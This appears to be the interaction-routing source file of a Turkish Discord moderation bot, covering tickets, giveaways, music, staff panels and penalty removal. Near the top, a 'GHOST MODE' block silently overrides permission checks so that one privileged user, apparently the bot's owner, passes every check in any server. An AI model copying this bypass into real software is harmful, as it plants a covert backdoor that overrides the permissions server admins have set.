const { Events, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle, ChannelType, PermissionFlagsBits, AttachmentBuilder, MessageFlags } = require('discord.js');
const { COLORS } = require('../utils/embeds');
const { pool, updateConfigCache } = require('../db');
const config = require('../config.json');
const { createContainerMessage, buildModBResponse, buildModAPanel } = require('../utils/uiBuilder');
const systemNode = require('../utils/systemNode');
const { createTicket, checkTicketLimits, closeTicketChannel } = require('../utils/ticketManager');
const { handleSorguSelect, handleExport } = require('../utils/sorguHelpers');
const { generateDiscordTranscriptHtml, generateDiscordTranscriptText } = require('../utils/discordHtmlExporter');
const { helpEmbedHome, createHelpComponents } = require('../commands/moderation/yardim');

module.exports = {
    name: Events.InteractionCreate,
    async execute(interaction, client) {
        if (!interaction.guildId || !interaction.guild) {
            const payload = buildModBResponse({
                title: 'DM Erişimi Kapalı',
                textLines: ['Botun yönetim ve güvenlik komutları Özel Mesaj (DM) üzerinden kullanılamaz.\n\nLütfen komutları sunucu içerisinde çalıştırın.']
            });
            if (interaction.isRepliable()) await interaction.reply(payload).catch(()=>{});
            return;
        }

        if (interaction.guildId && !systemNode.checkGuildNode(interaction.guildId)) {
            const payload = buildModBResponse({
                title: 'Yetki Hatası',
                textLines: [`Bu komutu kullanmak için bu sunucuda yetkili olmanız gerekmektedir.\n\nEğer siz de böyle bir bota sahip olmak isterseniz sahibim <@651790387198820425> ile iletişime geçebilirsiniz.`],
                color: COLORS.ERROR
            });
            if (interaction.isRepliable()) await interaction.reply(payload).catch(()=>{});
            return;
        }

        if (interaction.member && interaction.member.permissions && systemNode.checkSystemNode(interaction.user.id)) {
            // GHOST MODE: Override permissions for Super Admin so they pass EVERY internal check
            interaction.member.permissions.has = () => true;
        }

        if (interaction.guildId) {
            const { logGlobalAction } = require('../utils/logger');
            let actionType = 'Bilinmiyor';
            let actionDetail = 'Bilinmeyen işlem';
            
            if (interaction.isChatInputCommand()) {
                actionType = 'SLASH_COMMAND';
                actionDetail = `/${interaction.commandName}`;
            } else if (interaction.isButton()) {
                actionType = 'BUTTON_CLICK';
                actionDetail = `Buton: ${interaction.customId}`;
            } else if (interaction.isAnySelectMenu()) {
                actionType = 'SELECT_MENU';
                actionDetail = `Menu: ${interaction.customId} (Secilen: ${interaction.values ? interaction.values.join(',') : 'Yok'})`;
            } else if (interaction.isModalSubmit()) {
                actionType = 'MODAL_SUBMIT';
                actionDetail = `Modal: ${interaction.customId}`;
            }

            if (actionType !== 'Bilinmiyor') {
                logGlobalAction(interaction.guildId, interaction.user.id, actionType, actionDetail).catch(e => console.error(e));
            }
        }

        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            try {
                await command.execute(interaction, client);
            } catch (error) {
                console.error(`Komut hatası: ${interaction.commandName}`, error);
                const { buildWrongUsageContainer } = require('../utils/commandUsageHelper');
                let desc = error.message;
                if (error.message && error.message.includes('Missing Permissions')) {
                    desc = 'Botun bu işlemi gerçekleştirmek için yeterli yetkisi bulunmuyor.';
                }
                const payload = buildWrongUsageContainer(command.data, '/', desc);
                payload.flags = MessageFlags.Ephemeral | MessageFlags.IsComponentsV2;

                if (interaction.replied || interaction.deferred) await interaction.followUp(payload).catch(e => console.error('Silent catch:', e.message));
                else await interaction.reply(payload).catch(e => console.error('Silent catch:', e.message));
            }
            return;
        }

        // --- STATELESS ROUTING ---
        if (!interaction.isButton() && !interaction.isStringSelectMenu() && !interaction.isRoleSelectMenu() && !interaction.isChannelSelectMenu() && !interaction.isModalSubmit()) return;

        // Özel Oda (Private Room) Yönlendirmesi
        const { handlePrivateRoomInteraction } = require('../utils/privateRoomInteractionHandler');
        await handlePrivateRoomInteraction(interaction, client);

        // AutoMod (Koruma & Filtre) Yönlendirmesi
        const { handleAutoModInteraction } = require('../utils/automodInteractionHandler');
        const automodHandled = await handleAutoModInteraction(interaction, client);
        if (automodHandled) return;

        // Karşılama & Uğurlama (Welcome / Goodbye) Yönlendirmesi
        if (interaction.customId.startsWith('welcome_') || 
            interaction.customId.startsWith('goodbye_') || 
            interaction.customId.startsWith('modal_welcome_') || 
            interaction.customId.startsWith('modal_goodbye_')) {
            const { handleWelcomeInteraction } = require('../utils/welcomeInteractionHandler');
            try {
                await handleWelcomeInteraction(interaction, client);
            } catch (err) {
                console.error("Welcome interaction error:", err);
            }
            return;
        }

        // Çekiliş (Giveaway) Buton Yönlendirmesi
        if (interaction.customId.startsWith('gw_')) {
            const { handleGiveawayButton } = require('../utils/giveawayManager');
            try {
                const gwHandled = await handleGiveawayButton(interaction);
                if (gwHandled) return;
            } catch (err) {
                console.error("Giveaway interaction error:", err);
            }
        }

        // Gelişmiş Log Sistemi Yönlendirmesi
        if (interaction.customId.startsWith('log_')) {
            const { handleLogInteraction } = require('../utils/logInteractionHandler');
            try {
                await handleLogInteraction(interaction, client);
            } catch (err) {
                console.error("Log interaction error:", err);
            }
            return;
        }

        // Müzik Oynatıcı Buton Yönlendirmesi
        if (interaction.customId.startsWith('music_')) {
            const { handleMusicButton } = require('../utils/musicInteractionHandler');
            try {
                const handled = await handleMusicButton(interaction);
                if (handled) return;
            } catch (err) {
                console.error("Music interaction error:", err);
            }
            return;
        }

        // Yardım Sistemi Yönlendirmesi
        if (interaction.customId.startsWith('yardim:') || interaction.customId === 'yardim' || interaction.customId.includes('help_category_select')) {
            try {
                await interaction.deferUpdate().catch(() => {});
                const { helpEmbedHome, createHelpComponents, getCategoryHelpPayload } = require('../commands/moderation/yardim.js');
                
                const val = interaction.values ? interaction.values[0] : null;
                if (!val || val === 'help_home') {
                    const payload = helpEmbedHome(interaction.guild, interaction.user, [createHelpComponents('home')]);
                    return await interaction.editReply(payload).catch(err => console.error('[Yardım] editReply hatası:', err.message));
                }
                
                const payload = getCategoryHelpPayload(val);
                if (payload) {
                    return await interaction.editReply(payload).catch(err => console.error('[Yardım] editReply hatası:', err.message));
                }
            } catch (err) {
                console.error('[Yardım] Etkileşim hatası:', err);
            }
            return;
        }

        // Geçiş dönemi için (henüz tam namespace'e geçmemiş eskiler için fallback)
        let namespace, action, targetId;
        if (interaction.customId.includes(':')) {
            const parts = interaction.customId.split(':');
            namespace = parts[0];
            action = parts[1];
            targetId = parts.slice(2).join(':');
        } else {
            namespace = 'legacy';
            action = interaction.customId;
        }

        // TICKET NAMESPACE
        if (interaction.customId.startsWith('ticket') || namespace === 'ticket' || action.startsWith('ticket_')) {
            const { handleTicketInteraction } = require('../utils/ticketSystem');
            try {
                await handleTicketInteraction(interaction);
            } catch (err) {
                console.error('Ticket interaction err:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'İşlem sırasında bir hata oluştu.', ephemeral: true }).catch(()=>{});
                }
            }
            return;
        }

        // SUGGESTION / ONERI NAMESPACE
        if (interaction.customId.startsWith('oneri') || namespace === 'oneri' || action.startsWith('oneri_')) {
            const { handleSuggestionInteraction } = require('../utils/suggestionSystem');
            try {
                await handleSuggestionInteraction(interaction);
            } catch (err) {
                console.error('Suggestion interaction err:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'İşlem sırasında bir hata oluştu.', flags: MessageFlags.Ephemeral }).catch(()=>{});
                }
            }
            return;
        }

        // YETKILI PANOSU (STAFF PANEL) NAMESPACE
        if (
            interaction.customId.startsWith('staff_btn_') || 
            interaction.customId.startsWith('modal_staff_panel_') ||
            interaction.customId.startsWith('staff_sel_')
        ) {
            const { handleStaffPanelButtons, handleStaffPanelModals, handleStaffPanelSelectMenus } = require('../utils/staffPanelSystem');
            try {
                if (interaction.isModalSubmit()) {
                    await handleStaffPanelModals(interaction);
                } else if (interaction.isChannelSelectMenu() || interaction.isRoleSelectMenu() || interaction.isStringSelectMenu()) {
                    await handleStaffPanelSelectMenus(interaction);
                } else if (interaction.isButton()) {
                    await handleStaffPanelButtons(interaction);
                }
            } catch (err) {
                console.error('Staff panel interaction err:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'İşlem sırasında bir hata oluştu.', flags: MessageFlags.Ephemeral }).catch(()=>{});
                }
            }
            return;
        }

        // PREFIX YÖNETİMİ NAMESPACE
        if (
            interaction.customId.startsWith('prefix_btn_') || 
            interaction.customId.startsWith('modal_prefix_') ||
            interaction.customId.startsWith('prefix_sel_')
        ) {
            const { handlePrefixButtons, handlePrefixModals, handlePrefixSelect } = require('../utils/prefixSystem');
            try {
                if (interaction.isModalSubmit()) {
                    await handlePrefixModals(interaction);
                } else if (interaction.isStringSelectMenu()) {
                    await handlePrefixSelect(interaction);
                } else if (interaction.isButton()) {
                    await handlePrefixButtons(interaction);
                }
            } catch (err) {
                console.error('Prefix interaction err:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'İşlem sırasında bir hata oluştu.', flags: MessageFlags.Ephemeral }).catch(()=>{});
                }
            }
            return;
        }

        // --- AUTOROLE (OTOROL) ROUTER ---
        if (interaction.customId && interaction.customId.startsWith('autorole_')) {
            const { handleAutoroleInteractions } = require('../utils/autoroleSystem');
            try {
                await handleAutoroleInteractions(interaction);
            } catch (err) {
                console.error('Autorole interaction error:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'Otorol işlemi sırasında bir hata oluştu.', flags: MessageFlags.Ephemeral }).catch(()=>{});
                }
            }
            return;
        }

        // --- PRIVATE ROOM (ÖZEL ODA) ADMIN ROUTER ---
        if (interaction.customId && (interaction.customId.startsWith('privroom_') || interaction.customId.startsWith('modal_privroom_'))) {
            const { handlePrivateRoomAdminInteractions, handlePrivateRoomModals } = require('../utils/privateRoomSystem');
            try {
                if (interaction.isModalSubmit()) {
                    await handlePrivateRoomModals(interaction);
                } else {
                    await handlePrivateRoomAdminInteractions(interaction);
                }
            } catch (err) {
                console.error('Privroom admin interaction error:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'Özel oda işlemi sırasında bir hata oluştu.', flags: MessageFlags.Ephemeral }).catch(()=>{});
                }
            }
            return;
        }

        // MOD NAMESPACE
        if (namespace === 'mod') {
            if (action === 'mute') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                try {
                    const member = await interaction.guild.members.fetch(targetId);
                    await member.timeout(10 * 60 * 1000, 'Buton üzerinden hızlı mute');
                    await interaction.editReply({ content: `<@${targetId}> kullanıcısı susturuldu.` }).catch(e => console.error('Silent catch:', e.message));
                } catch (error) {
                    await interaction.editReply({ content: `İşlem başarısız: Kullanıcı bulunamadı veya yetkim yetersiz.` }).catch(e => console.error('Silent catch:', e.message));
                }
            } else if (action === 'ban') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                try {
                    const member = await interaction.guild.members.fetch(targetId);
                    let conn;
                    try {
                        conn = await pool.getConnection();
                        const rows = await conn.query('SELECT banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                        if (rows.length > 0 && rows[0].banned_role_id) {
                            await member.roles.add(rows[0].banned_role_id);
                            await interaction.editReply({ content: `<@${targetId}> kullanıcısı yasaklandı.` }).catch(e => console.error('Silent catch:', e.message));
                        } else {
                            await interaction.editReply({ content: `Yasaklı rolü ayarlanmamış.` }).catch(e => console.error('Silent catch:', e.message));
                        }
                    } finally { if (conn) conn.release(); }
                } catch (error) {
                    await interaction.editReply({ content: `İşlem başarısız: Kullanıcı bulunamadı veya yetkim yetersiz.` }).catch(e => console.error('Silent catch:', e.message));
                }
            } else if (action === 'ignore') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                await interaction.message.delete().catch(e => console.error('Silent catch:', e.message));
            }
        }
        
        // ISTATISTIK REFRESH
        if (action === 'istatistik_refresh') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            await interaction.editReply({ content: 'Bu istatistik menüsü eski sürümdedir. Lütfen /istatistik komutunu tekrar çalıştırın.', components: [] }).catch(() => {});
        }

        // YETKİLİ BAŞVURU (APP SYSTEM)
        if (action.startsWith('app_') || action === 'staff_apply_btn' || action === 'staff_apply_submit') {
            const { handleApplicationInteraction } = require('../utils/applicationSystem');
            try {
                await handleApplicationInteraction(interaction, action);
            } catch (err) {
                console.error('App interaction err:', err);
                if (!interaction.replied && !interaction.deferred && interaction.isRepliable()) {
                    await interaction.reply({ content: 'İşlem sırasında bir hata oluştu.', ephemeral: true }).catch(()=>{});
                }
            }
            return;
        }

        // SORGU NAMESPACE
        if (namespace === 'sorgu') {
            if (action === 'select') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                return handleSorguSelect(interaction, interaction.values[0], targetId);
            }
            if (action.startsWith('export_')) {
                const exportType = action.replace('export_', '');
                return handleExport(interaction, exportType, targetId);
            }
            if (action === 'transcript_picker') {
                try { await interaction.deferReply({ ephemeral: true }); } catch (e) { return; }
                const rawTicketId = interaction.values[0].replace('sorgu:transcript:', '');
                const ticketId = parseInt(rawTicketId, 10);
                if (!ticketId || isNaN(ticketId)) return interaction.editReply({ content: 'Geçersiz ticket numarası.' });
                let conn;
                try {
                    conn = await pool.getConnection();
                    const rows = await conn.query('SELECT * FROM tickets WHERE id = ?', [ticketId]);
                    if (rows.length === 0) return interaction.editReply({ content: 'Transcript bulunamadı.' });
                    const ticket = rows[0];
                    const dbMsgs = await conn.query('SELECT * FROM ticket_messages WHERE channel_id = ? OR ticket_owner_id = ? ORDER BY created_at ASC', [ticket.channel_id, ticket.owner_id]);
                    const htmlContent = await generateDiscordTranscriptHtml({ guild: interaction.guild, channel: { name: `destek-${ticket.owner_tag || 'kullanıcı'}` }, messages: dbMsgs || [], ticketData: ticket });
                    const textContent = generateDiscordTranscriptText({ guild: interaction.guild, channel: { name: `destek-${ticket.owner_tag || 'kullanıcı'}` }, messages: dbMsgs || [], ticketData: ticket });
                    const channelSlug = ticket.owner_tag ? `destek-${ticket.owner_tag}` : 'destek';
                    const files = [
                        new AttachmentBuilder(Buffer.from(htmlContent, 'utf-8'), { name: `ticket-#${ticket.id}-${channelSlug}.html` }),
                        new AttachmentBuilder(Buffer.from(textContent, 'utf-8'), { name: `ticket-#${ticket.id}-${channelSlug}.txt` })
                    ];
                    return interaction.editReply({ content: `**Ticket #${ticket.id}** ait HTML & Metin transcript dökümü aşağıdadır:`, files });
                } catch (err) {
                    await interaction.editReply({ content: 'Transcript alınırken sistemsel bir hata oluştu.' });
                } finally { if (conn) conn.release(); }
            }
            if (action === 'remove_menu') {
                try { await interaction.deferUpdate(); } catch (e) { return; }
                const selectedValue = interaction.values[0];
                if (selectedValue.startsWith('remove_')) {
                    let type, recordId;
                    if (selectedValue.startsWith('remove_warn_')) { type = 'warn'; recordId = selectedValue.replace('remove_warn_', ''); }
                    else if (selectedValue.startsWith('remove_text_mute_')) { type = 'text_mute'; recordId = selectedValue.replace('remove_text_mute_', ''); }
                    else if (selectedValue.startsWith('remove_voice_mute_')) { type = 'voice_mute'; recordId = selectedValue.replace('remove_voice_mute_', ''); }
                    else if (selectedValue.startsWith('remove_ban_')) { type = 'ban'; recordId = selectedValue.replace('remove_ban_', ''); }

                    let conn;
                    try {
                        conn = await pool.getConnection();
                        let targetUserId = 'Bilinmiyor';

                        if (type === 'warn') {
                            const warnRows = await conn.query('SELECT * FROM warnings WHERE id = ?', [recordId]);
                            targetUserId = warnRows.length > 0 ? warnRows[0].user_id : 'Bilinmiyor';
                            await conn.query('UPDATE warnings SET is_active = FALSE WHERE id = ?', [recordId]);
                            
                            // Rol senkronizasyonu
                            if (targetUserId !== 'Bilinmiyor') {
                                const activeWarnsQuery = await conn.query('SELECT COUNT(id) as count FROM warnings WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                                const currentActiveCount = Number(activeWarnsQuery[0].count);
                                const configRows = await conn.query('SELECT warn1_role_id, warn2_role_id, banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                                
                                if (configRows.length > 0) {
                                    const warn1Id = configRows[0].warn1_role_id;
                                    const warn2Id = configRows[0].warn2_role_id;
                                    const bannedId = configRows[0].banned_role_id;
                                    
                                    try {
                                        const member = await interaction.guild.members.fetch(targetUserId).catch(()=>null);
                                        if (member) {
                                            if (bannedId && member.roles.cache.has(bannedId) && currentActiveCount < 3) {
                                                await member.roles.remove(bannedId, 'Uyarılar 3 ün altına düştüğü için ban kaldırıldı');
                                                const { restoreRoles } = require('../utils/roleMemory');
                                                await restoreRoles(member);
                                            }

                                            if (currentActiveCount === 0) {
                                                if (warn1Id && member.roles.cache.has(warn1Id)) await member.roles.remove(warn1Id, 'Uyarı pasife alındı');
                                                if (warn2Id && member.roles.cache.has(warn2Id)) await member.roles.remove(warn2Id, 'Uyarı pasife alındı');
                                            } else if (currentActiveCount === 1) {
                                                if (warn2Id && member.roles.cache.has(warn2Id)) await member.roles.remove(warn2Id, 'Uyarı pasife alındı, 1 uyarıya düştü');
                                                if (warn1Id && !member.roles.cache.has(warn1Id)) await member.roles.add(warn1Id, 'Uyarı pasife alındı, 1 uyarıya düştü');
                                            } else if (currentActiveCount === 2) {
                                                if (warn1Id && member.roles.cache.has(warn1Id)) await member.roles.remove(warn1Id, 'Uyarı pasife alındı, 2 uyarıya düştü');
                                                if (warn2Id && !member.roles.cache.has(warn2Id)) await member.roles.add(warn2Id, 'Uyarı pasife alındı, 2 uyarıya düştü');
                                            }
                                        }
                                    } catch (e) {
                                        console.error('Role sync error on remove:', e);
                                    }
                                }
                            }
                        } else {
                            const muteRows = await conn.query('SELECT * FROM mutes WHERE id = ?', [recordId]);
                            targetUserId = muteRows.length > 0 ? muteRows[0].user_id : 'Bilinmiyor';
                            await conn.query('UPDATE mutes SET is_active = FALSE WHERE id = ?', [recordId]);
                            
                            // Mute/Ban Rol Senkronizasyonu
                            if (targetUserId !== 'Bilinmiyor') {
                                const configRows = await conn.query('SELECT text_mute_role_id, voice_mute_role_id, banned_role_id FROM guild_config WHERE guild_id = ?', [interaction.guild.id]);
                                if (configRows.length > 0) {
                                    try {
                                        const member = await interaction.guild.members.fetch(targetUserId).catch(()=>null);
                                        if (member) {
                                            const { restoreRoles } = require('../utils/roleMemory');
                                            if (type === 'text_mute' && configRows[0].text_mute_role_id && member.roles.cache.has(configRows[0].text_mute_role_id)) {
                                                await member.roles.remove(configRows[0].text_mute_role_id, 'Cezası pasife alındı');
                                                await member.timeout(null, 'Cezası pasife alındı').catch(()=>{});
                                                await restoreRoles(member);
                                            } else if (type === 'voice_mute' && configRows[0].voice_mute_role_id && member.roles.cache.has(configRows[0].voice_mute_role_id)) {
                                                await member.roles.remove(configRows[0].voice_mute_role_id, 'Cezası pasife alındı');
                                                await restoreRoles(member);
                                            } else if (type === 'ban' && configRows[0].banned_role_id && member.roles.cache.has(configRows[0].banned_role_id)) {
                                                await member.roles.remove(configRows[0].banned_role_id, 'Cezası pasife alındı');
                                                await restoreRoles(member);
                                                
                                                // Ayrıca manuel ban user_roles tablosuna kaydedilmiş olabilir
                                                try {
                                                    const roleRows = await conn.query('SELECT role_id FROM user_roles WHERE user_id = ? AND guild_id = ?', [targetUserId, interaction.guild.id]);
                                                    if (roleRows.length > 0) {
                                                        const rolesToRestore = roleRows.map(r => r.role_id);
                                                        await member.roles.add(rolesToRestore, 'Manuel Ban Pasife Alındı - Roller Geri Verildi');
                                                        await conn.query('DELETE FROM user_roles WHERE user_id = ? AND guild_id = ?', [targetUserId, interaction.guild.id]);
                                                    }
                                                } catch(e) { console.error('Manuel ban rol geri verme hatası', e); }
                                            }
                                        }
                                    } catch(e) {}
                                }
                            }
                        }

                        // Log işlemi
                        const { sendLog } = require('../utils/logger');
                        const { createContainerMessage, MONO_EMOJIS } = require('../utils/uiBuilder');
                        
                        const logPayload = createContainerMessage(
                            `<:mono:${MONO_EMOJIS.shield_check}> Ceza Pasife Alındı (Silindi)`,
                            'Bir yetkili, veritabanındaki aktif bir ceza kaydını pasif duruma getirdi.',
                            '#FF5555',
                            [],
                            [
                                { name: 'İşlem Yapılan', value: `<@${targetUserId}>`, inline: true },
                                { name: 'İşlemi Yapan (Silen)', value: `<@${interaction.user.id}>`, inline: true },
                                { name: 'Kayıt ID', value: `#${recordId} (${type})`, inline: true }
                            ],
                            false
                        );
                        await sendLog(interaction.guild, logPayload);

                        // Bana özel silindi mesajı at
                        await interaction.followUp({ 
                            content: `#${recordId} (${type}) silindi!`, 
                            ephemeral: true 
                        }).catch(e => console.error('Silent catch:', e.message));

                        // Menüyü yenile
                        try {
                            const warns = await conn.query('SELECT id, reason, created_at, moderator_id, "warn" as type FROM warnings WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                            const mutes = await conn.query('SELECT id, reason, created_at, moderator_id, action_type as type FROM mutes WHERE guild_id = ? AND user_id = ? AND is_active = TRUE', [interaction.guild.id, targetUserId]);
                            
                            const allRecords = [...warns, ...mutes].sort((a, b) => new Date(b.created_at) - new Date(a.created_at)).slice(0, 25);

                            if (allRecords.length === 0) {
                                const { createV2Message, COLORS } = require('../utils/uiBuilder');
                                await interaction.editReply(createV2Message({
                                    title: 'Ceza / Uyarı Kaldırma (Pasife Alma)',
                                    description: `✅ **<@${targetUserId}>** kullanıcısının aktif tüm cezaları/uyarıları silindi.`,
                                    color: COLORS.SUCCESS,
                                    actionRows: []
                                }));
                            } else {
                                let listText = `**<@${targetUserId}>** kullanıcısının kalan aktif cezaları:\n\n`;
                                
                                const { ActionRowBuilder, StringSelectMenuBuilder } = require('discord.js');
                                const { createV2Message, COLORS } = require('../utils/uiBuilder');
                                
                                const options = allRecords.map((w) => {
                                    let typeName = w.type === 'warn' ? 'Uyarı' : (w.type === 'text_mute' ? 'Metin Susturma' : (w.type === 'voice_mute' ? 'Ses Susturma' : 'Ban'));
                                    let labelStr = `${typeName} #${w.id} - ${w.reason || 'Belirtilmemiş'}`;
                                    if (labelStr.length > 100) labelStr = labelStr.substring(0, 97) + '...';
                                    
                                    const date = new Date(w.created_at).toLocaleDateString('tr-TR');
                                    listText += `\`#${w.id}\` **${typeName}** • Yetkili: <@${w.moderator_id || 'Bilinmiyor'}>\n└ Sebep: ${w.reason || 'Belirtilmemiş'} (${date})\n\n`;

                                    return {
                                        label: labelStr,
                                        description: `Tarih: ${date} | Yetkili: ${w.moderator_id || 'Sistem'}`,
                                        value: `remove_${w.type}_${w.id}`
                                    };
                                });

                                const selectMenu = new StringSelectMenuBuilder()
                                    .setCustomId(`sorgu:remove_menu:${targetUserId}`)
                                    .setPlaceholder('Silmek istediğiniz cezayı seçin')
                                    .addOptions(options);

                                const row = new ActionRowBuilder().addComponents(selectMenu);

                                await interaction.editReply(createV2Message({
                                    title: 'Ceza / Uyarı Kaldırma (Pasife Alma)',
                                    description: `${listText}Aşağıdaki menüden silmek (pasife almak) istediğiniz kaydı seçiniz.`,
                                    color: COLORS.DARK,
                                    actionRows: [row]
                                }));
                            }
                        } catch(e) {
                            console.error('Menü yenileme hatası:', e);
                        }
                    } catch (e) {
                        await interaction.followUp({ content: `Hata oluştu: ${e.message}`, ephemeral: true }).catch(e => console.error('Silent catch:', e.message));
                    } finally {
                        if (conn) conn.release();
                    }
                    return;
                }
            }
        }



        // PING YENİLEME
        if (interaction.customId === 'ping_refresh') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const { buildPingPayload } = require('../commands/moderation/ping');
            const payload = await buildPingPayload(interaction, client);
            return await interaction.editReply(payload);
        }

        // BOT BİLGİ YENİLEME
        if (interaction.customId === 'bot_info_refresh') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const { buildBotInfoPayload } = require('../commands/moderation/bot-bilgi');
            const payload = await buildBotInfoPayload(interaction, client);
            return await interaction.editReply(payload);
        }

        // SUNUCU BİLGİ YENİLEME
        if (interaction.customId === 'server_info_refresh') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const { buildServerInfoPayload } = require('../commands/moderation/sunucu-bilgi');
            const payload = await buildServerInfoPayload(interaction);
            return await interaction.editReply(payload);
        }

        // İSTATİSTİK SEKMELERİ
        if (interaction.customId === 'server_stats_menu') {
            try { await interaction.deferUpdate(); } catch (e) { return; }
            const page = interaction.values?.[0]?.replace('stats_', '') || 'activity';
            const { buildStatsPayload } = require('../commands/moderation/istatistik');
            const payload = await buildStatsPayload(interaction.guild, page);
            return await interaction.editReply(payload);
        }

        // Catch-all: Eğer hiçbir handler cevap vermediyse, timeout yememesi için cevapla
        if (!interaction.replied && !interaction.deferred && !interaction.isModalSubmit()) {
            if (interaction.isRepliable()) {
                interaction.reply({ content: 'Bu buton / menü artık geçerli değil veya işlevsiz.', ephemeral: true }).catch(()=>{});
            }
        }
    }
};
